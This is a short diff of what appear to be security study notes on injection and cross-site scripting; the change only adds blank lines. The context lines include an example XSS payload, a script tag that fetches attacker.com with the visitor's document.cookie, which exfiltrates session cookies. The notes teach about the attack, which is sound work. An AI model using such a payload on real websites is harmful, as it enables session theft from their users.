@@ -1,4 +1,5 @@
 
+
 When the user input is not sanitized properly , the attacker can inject the malcious payload , for example 
 
 <h1>Hello {{ username }}</h1>
@@ -69,3 +70,4 @@ XSS is a common vulnerability that occurs when a web application takes untrusted
 - **Example Payload:** `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>` (attempts to steal the user's session cookie).
     
 - **Analogy:** It's like leaving a malicious script on a public bulletin board; anyone who views the board (the webpage) has the script run on their personal computer (their browser).
+
